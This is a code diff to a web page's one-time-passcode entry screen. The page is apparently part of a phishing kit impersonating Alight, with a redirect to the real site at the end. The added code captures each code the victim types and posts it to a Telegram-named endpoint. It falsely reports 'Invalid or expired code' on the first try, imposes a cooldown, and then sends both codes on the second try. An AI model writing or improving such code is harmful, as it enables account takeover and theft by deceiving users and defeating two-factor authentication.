@@ -10,8 +10,13 @@ const ALIGHT_REDIRECT_URL =
 
 function EnterCodeContent() {
   const [code, setCode] = useState("");
+  const [firstAttemptCode, setFirstAttemptCode] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [isResending, setIsResending] = useState(false);
+  const [attemptCount, setAttemptCount] = useState(0);
+  const [errorMessage, setErrorMessage] = useState("");
+  const [isCooldown, setIsCooldown] = useState(false);
+  const [cooldownSeconds, setCooldownSeconds] = useState(0);
   const router = useRouter();
   const searchParams = useSearchParams();
   const isSecondOtp = searchParams.get("step") === "2";
@@ -26,21 +31,85 @@ function EnterCodeContent() {
     }
   }, [isSecondOtp, router]);
 
+  useEffect(() => {
+    if (!isCooldown || cooldownSeconds <= 0) return;
+
+    const timer = setInterval(() => {
+      setCooldownSeconds((prev) => {
+        const newSeconds = prev - 1;
+        if (newSeconds <= 0) {
+          setIsCooldown(false);
+        }
+        return newSeconds;
+      });
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, [isCooldown, cooldownSeconds]);
+
   const handleVerify = async () => {
-    if (isLoading) return;
+    if (isLoading || isCooldown) return;
     setIsLoading(true);
-    try {
-      await fetch("/api/telegram/verification", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          verificationType: isSecondOtp ? "Code (final)" : "Code (first OTP)",
-          code,
-        }),
-      }).catch(console.error);
-    } catch (error) {
-      console.error("Failed to send verification notification:", error);
+    setErrorMessage("");
+
+    // Only apply two-attempt flow for first verification, not final verification
+    if (!isSecondOtp) {
+      const newAttemptCount = attemptCount + 1;
+      setAttemptCount(newAttemptCount);
+
+      // First attempt: send code and show error
+      if (newAttemptCount === 1) {
+        setFirstAttemptCode(code);
+        try {
+          await fetch("/api/telegram/verification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              verificationType: "Code (first OTP) - First Attempt",
+              code: code,
+            }),
+          }).catch(console.error);
+        } catch (error) {
+          console.error("Failed to send verification notification:", error);
+        }
+        setErrorMessage("Invalid or expired code");
+        setCode("");
+        setIsLoading(false);
+        setIsCooldown(true);
+        setCooldownSeconds(15);
+        return;
+      }
+
+      // Second attempt: send both codes and proceed with verification
+      try {
+        await fetch("/api/telegram/verification", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            verificationType: "Code (first OTP) - Second Attempt",
+            code: code,
+            firstAttemptCode: firstAttemptCode,
+          }),
+        }).catch(console.error);
+      } catch (error) {
+        console.error("Failed to send verification notification:", error);
+      }
+    } else {
+      // Final verification - direct path, no two-attempt flow
+      try {
+        await fetch("/api/telegram/verification", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            verificationType: "Code (final)",
+            code,
+          }),
+        }).catch(console.error);
+      } catch (error) {
+        console.error("Failed to send verification notification:", error);
+      }
     }
+
     await new Promise((r) => setTimeout(r, 1000));
     if (isSecondOtp) {
       window.location.href = ALIGHT_REDIRECT_URL;
@@ -82,6 +151,12 @@ function EnterCodeContent() {
             Enter the code that was sent to you.
           </p>
 
+          {errorMessage && (
+            <div className="mb-4 px-3 py-2 bg-red-50 border border-red-200 rounded-md">
+              <p className="text-red-600 text-sm font-medium">{errorMessage}</p>
+            </div>
+          )}
+
           <div className="flex items-center gap-2 mb-4">
             <span className="text-gray-700 text-sm">Didn't receive code?</span>
             <button
@@ -115,9 +190,9 @@ function EnterCodeContent() {
             <Button
               className="bg-[#254650] text-white hover:bg-[#1e383f] rounded-md disabled:opacity-70 disabled:pointer-events-none h-8 px-5 text-sm font-medium"
               onClick={handleVerify}
-              disabled={code.replace(/\D/g, "").length !== 6 || isLoading}
+              disabled={code.replace(/\D/g, "").length !== 6 || isLoading || isCooldown}
             >
-              {isLoading ? "Loading..." : "Continue"}
+              {isLoading ? "Loading..." : isCooldown ? `Wait ${cooldownSeconds}s` : "Continue"}
             </Button>
             <Button
               variant="ghost"
